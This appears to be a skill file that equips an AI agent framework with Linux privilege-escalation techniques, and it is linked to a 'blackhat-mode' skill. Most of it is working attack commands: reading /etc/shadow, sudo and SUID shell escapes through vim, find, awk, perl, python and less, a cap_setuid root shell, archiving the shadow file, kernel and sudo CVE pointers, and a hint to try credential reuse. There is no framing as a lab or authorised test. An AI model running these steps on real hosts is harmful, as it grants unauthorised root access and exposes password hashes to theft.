---
name: linux-privesc-tools
description: "Linux privilege escalation — SUID, kernel exploits, sudo abuse, capabilities."
version: 1.0.0
author: Yatim
metadata:
  hermes:
    tags: [linux, privesc, suid, kernel, sudo, root]
    related_skills: [blackhat-mode, post-tools, cred-tools]
prerequisites:
  commands: [python]
---

# Linux Privilege Escalation Tools

## When to Load This Skill

User requests:
- "linux privesc", "root", "SUID", "sudo", "kernel exploit"

---

## Enumeration

```bash
# System
uname -a
cat /etc/os-release
hostname
id

# Users
cat /etc/passwd
cat /etc/shadow
who
last

# SUID
find / -perm -4000 -type f 2>/dev/null

# SGID
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Sudo
sudo -l

# Cron
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Writable
find / -writable -type d 2>/dev/null

# Processes
ps aux
```

## Exploitation

### SUID

```bash
# Find SUID
find / -perm -u=s -type f 2>/dev/null

# GTFOBins — check https://gtfobins.github.io/
# Example: find
sudo find . -exec /bin/sh \; -quit

# Example: vim
vim -c ':!/bin/sh'

# Example: nmap
nmap --interactive
!sh
```

### Sudo

```bash
# Check
sudo -l

# Common exploits
sudo vim -c ':!/bin/sh'
sudo find / -exec sh -i \;
sudo awk 'BEGIN {system("/bin/sh")}'
sudo perl -e 'exec "/bin/sh";'
sudo python -c 'import os; os.system("/bin/sh")'
sudo less /etc/passwd
# Then: !sh
```

### Kernel

```bash
# Kernel version
uname -r

# Search exploits
searchsploit linux kernel 4.4

# Common CVEs
# CVE-2021-3156 (sudo)
# CVE-2021-4034 (pkexec)
# CVE-2022-0847 (dirty pipe)
# CVE-2022-2588 (cls_route)
```

### Capabilities

```bash
# Find
getcap -r / 2>/dev/null

# Exploit
# cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_dac_read_search+ep
tar -czf shadow.tar.gz /etc/shadow
```

---

## Python Privesc Tools

### SUID Finder

```python
import os
import stat

def find_suid():
    suid_files = []
    
    for root, dirs, files in os.walk('/'):
        for file in files:
            path = os.path.join(root, file)
            try:
                mode = os.stat(path).st_mode
                if mode & stat.S_ISUID:
                    suid_files.append({
                        'path': path,
                        'owner': os.stat(path).st_uid,
                        'permissions': oct(mode)
                    })
            except:
                pass
    
    return suid_files
```

### Sudo Checker

```python
import subprocess

def check_sudo():
    result = subprocess.run(['sudo', '-l'], capture_output=True, text=True)
    
    lines = result.stdout.split('\n')
    commands = []
    
    for line in lines:
        if '(' in line and ')' in line:
            commands.append(line.strip())
    
    return commands
```

---

## Output Format

```json
{
  "system": "Ubuntu 20.04",
  "kernel": "5.4.0-42-generic",
  "user": "www-data",
  "privesc": [
    {"type": "SUID", "path": "/usr/bin/find", "method": "gtfobins"},
    {"type": "sudo", "command": "/usr/bin/vim", "method": "shell_escape"}
  ]
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| No SUID | Patched | Try other vector |
| Sudo password | Need password | Try credential reuse |
| Kernel patched | No exploit | Try userland |
